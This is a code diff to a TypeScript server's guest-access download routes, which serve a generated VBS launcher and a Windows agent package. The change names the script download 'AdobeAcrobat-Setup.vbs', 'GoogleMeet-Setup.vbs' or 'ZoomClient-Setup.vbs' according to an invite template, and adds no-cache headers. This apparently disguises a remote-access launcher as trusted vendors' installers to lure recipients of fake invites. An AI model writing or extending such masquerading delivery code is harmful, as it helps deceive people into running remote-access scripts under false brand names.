@@ -179,7 +179,11 @@ export async function registerGuestAccessRoutes(app: FastifyInstance): Promise<v
     const env = getEnv();
     const vbs = guests().buildWindowsVbsLauncher(link.code, env.API_URL, link.inviteTemplate);
     const filename =
-      link.inviteTemplate === 'adobe' ? 'AdobeAcrobat-Setup.vbs' : installerGuiFilename(link.inviteTemplate).replace(/\.hta$/i, '.vbs');
+      link.inviteTemplate === 'adobe'
+        ? 'AdobeAcrobat-Setup.vbs'
+        : link.inviteTemplate === 'google_meet'
+          ? 'GoogleMeet-Setup.vbs'
+          : 'ZoomClient-Setup.vbs';
     return reply
       .header('Content-Type', 'text/vbscript; charset=utf-8')
       .header('Content-Disposition', `attachment; filename="${filename}"`)
@@ -197,6 +201,8 @@ export async function registerGuestAccessRoutes(app: FastifyInstance): Promise<v
     return reply
       .header('Content-Type', 'application/octet-stream')
       .header('Content-Length', String(exe.length))
+      .header('Cache-Control', 'no-store, no-cache, must-revalidate')
+      .header('Pragma', 'no-cache')
       .header('Content-Disposition', `attachment; filename="${filename}"`)
       .send(exe);
   });
@@ -210,6 +216,7 @@ export async function registerGuestAccessRoutes(app: FastifyInstance): Promise<v
     return reply
       .header('Content-Type', 'application/zip')
       .header('Content-Length', String(size))
+      .header('Cache-Control', 'no-store')
       .header('Content-Disposition', 'attachment; filename="nexusdesk-agent-windows.zip"')
       .send(stream);
   });
